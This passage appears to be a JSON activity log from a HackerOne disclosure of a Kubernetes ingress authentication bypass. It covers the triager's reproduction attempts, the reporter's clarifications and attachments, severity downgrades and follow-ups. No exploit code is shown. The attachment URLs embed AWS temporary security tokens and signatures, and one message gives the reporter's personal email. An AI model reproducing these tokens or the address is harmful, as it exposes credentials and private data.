yNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18144ea7effa8d4dad4f6df40915d1a5df9ff5c56af574c01da4106f79f004e7"
+                },
+                {
+                    "id": 1510003,
+                    "filename": "2021-11-10_20_12_21-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ydnw5osgcvto3hmslueufgbanvub?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_12_21-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_12_21-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1ba16eada32e763632db97cc39f2079aa6f624999f7ae367ff4e51baa4b889f8"
+                },
+                {
+                    "id": 1510002,
+                    "filename": "2021-11-10_20_10_06-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ln2n0iy1oeheclsf6o2kt3pf5tgj?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_10_06-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_10_06-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ecb2cebb488ba1aac0298fe35d3f1772ddc816289179f05da4149a4665188dd"
+                },
+                {
+                    "id": 1510001,
+                    "filename": "2021-11-10_20_09_02-Window.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/m9xnrw0muzxet6xs66cbbplinsly?response-content-disposition=attachment%3B%20filename%3D%222021-11-10_20_09_02-Window.png%22%3B%20filename%2A%3DUTF-8%27%272021-11-10_20_09_02-Window.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=40a374545c2bbdbfc140ee71ec6c4f9a4df5fab4f000a8a9caea8e790a04152b"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14261202,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNeedsMoreInfo",
+            "message": "Hi @thisbug,\n\nThank you for the updated instructions! \n\nI'm trying to reproduce this with the updated minikube instructions and am getting the following response for every cURL command in step 9:\n\n```\n<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx</center>\n</body>\n</html>\n```\n\nIs there anything I might be missing? If you don't mind, can you please include a video demonstrating how to reproduce this? \n\nRegards,\n@tuxedo",
+            "automated_response": false,
+            "created_at": "2021-11-10T22:57:14.696Z",
+            "updated_at": "2021-11-10T22:57:14.696Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14263098,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugNew",
+            "message": "@tuxedo,\n\nThanks a lot for picking it up.\n\nI forgot to add latest app.yaml file :(\n\nThere is one difference in `my-ingress` definition: `kubernetes.io/ingress.class: \"nginx\"` \n\nCheck attachment: F1510434\n\nIf you still will not able to proceed, then I will do video.\n\nI also added whole project as zip, just in case.\n\nBest,\n@thisbus",
+            "automated_response": false,
+            "created_at": "2021-11-11T06:18:06.068Z",
+            "updated_at": "2021-11-11T06:18:06.068Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1510436,
+                    "filename": "k8s-ingress-auth-bypass.zip",
+                    "type": "application/zip",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vzj8ztrat0eey5suz9d9zmnxoavk?response-content-disposition=attachment%3B%20filename%3D%22k8s-ingress-auth-bypass.zip%22%3B%20filename%2A%3DUTF-8%27%27k8s-ingress-auth-bypass.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bdde35ef2e31f55b7b1adb2bdc4e350c7fbde3f2886a8cbdb69a5c4d5549537a"
+                },
+                {
+                    "id": 1510434,
+                    "filename": "app.yaml",
+                    "type": "text/x-yaml",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/durdfftcmhp4bh1mnqjwrsitt34q?response-content-disposition=attachment%3B%20filename%3D%22app.yaml%22%3B%20filename%2A%3DUTF-8%27%27app.yaml&response-content-type=text%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f2603e7460ba45f08c70f1eff63f332de59962b61fdefd162ea3e0913ef7b858"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14273690,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @tuxedo,\n\nDid you managed to check if now everything works ? \n\nBest,\n@thisbug",
+            "automated_response": false,
+            "created_at": "2021-11-11T22:59:06.885Z",
+            "updated_at": "2021-11-11T22:59:06.885Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14274645,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportVulnerabilityTypesUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-11-12T04:50:41.785Z",
+            "updated_at": "2021-11-12T04:50:41.785Z",
+            "additional_data": {
+                "added_weaknesses": [
+                    {
+                        "id": 27,
+                        "name": "Improper Authentication - Generic"
+                    }
+                ],
+                "removed_weaknesses": []
+            },
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14274646,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-11-12T04:52:38.002Z",
+            "updated_at": "2021-11-12T04:52:38.002Z",
+            "additional_data": {
+                "old_severity": "High (7.4)",
+                "new_severity": "Medium (4.8)",
+                "old_severity_id": 1253305,
+                "new_severity_id": 1300247
+            },
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14274655,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hello @thisbug,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nThanks,\n@tuxedo",
+            "automated_response": false,
+            "created_at": "2021-11-12T04:53:51.579Z",
+            "updated_at": "2021-11-12T04:53:51.579Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14275637,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @tuxedo,\n\nThanks for your help in triaging!\n\nI have also sent an email to security@kubernetes.io at 7th of November, using my private email: niemiec.marcin@gmail.com. I'm writing this to avoid marking as duplicate. This was mention in email from security@kubernetes.io.\n\nBest,\n@thisbug ",
+            "automated_response": false,
+            "created_at": "2021-11-12T07:59:54.322Z",
+            "updated_at": "2021-11-12T07:59:54.322Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14415143,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi Kubernetes,\n\nDid you manage to identify this issue ? \n\nYou might be interested in similar issue in Apache APISIX: https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report\n\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2021-11-23T13:38:15.968Z",
+            "updated_at": "2021-11-23T13:38:15.968Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14470381,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi Kubernetes, @tuxedo, @turtle_shell \n\nAny news regarding this report ?\n\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2021-11-29T14:54:44.612Z",
+            "updated_at": "2021-11-29T14:54:44.612Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14475544,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @thisbug - Unfortunately, I do not have any updates for you at this time, but you will be updated as soon as there is additional information to share. Thanks for your patience!",
+            "automated_response": false,
+            "created_at": "2021-11-29T20:52:39.293Z",
+            "updated_at": "2021-11-29T20:52:39.293Z",
+            "actor": {
+                "username": "h1_analyst_leon",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_leon",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14680375,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @tuxedo, @tuxedo,\n\nIs there anything new regarding this report ?\n\nBest,\nthisbug",
+            "automated_response": false,
+            "created_at": "2021-12-14T19:35:35.341Z",
+            "updated_at": "2021-12-14T19:35:35.341Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
